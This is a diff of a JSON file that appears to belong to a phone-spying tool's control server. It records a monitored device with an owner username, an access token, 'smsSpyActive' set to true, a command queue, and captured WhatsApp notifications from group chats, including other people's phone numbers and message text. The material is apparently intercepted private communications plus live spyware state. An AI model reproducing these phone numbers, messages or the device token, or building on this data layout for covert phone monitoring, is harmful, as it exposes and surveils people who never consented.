@@ -24,6 +24,14 @@
         "appName": "WhatsApp",
         "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
         "content": "087898838081",
+        "time": "02/04 02:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775068606423
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
+        "content": "087898838081",
         "time": "02/04 02:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1775068306679
@@ -4011,14 +4019,6 @@
         "time": "02/04 00:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1775059818345
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "APK BUG BY ZYRXX: ~ sanzz",
-        "content": "🎥 Diskon 25k aja pm 083181647282 (0.36)",
-        "time": "02/04 00:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775059818331
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
+        "content": "087898838081",
+        "time": "02/04 02:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775068606395
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
@@ -8056,14 +8064,6 @@
         "time": "02/04 00:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1775059818357
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (3 pesan): ~ toko fadly",
-        "content": "📊 open brp brp",
-        "time": "02/04 00:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775059818318
       }
     ],
     "galleryPhotos": [],
@@ -8371,7 +8371,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "520070cf4248976c6a5bc8d7767d78d8",
-    "lastSeen": 1775068590994,
+    "lastSeen": 1775068605993,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T17:49:10.524Z",
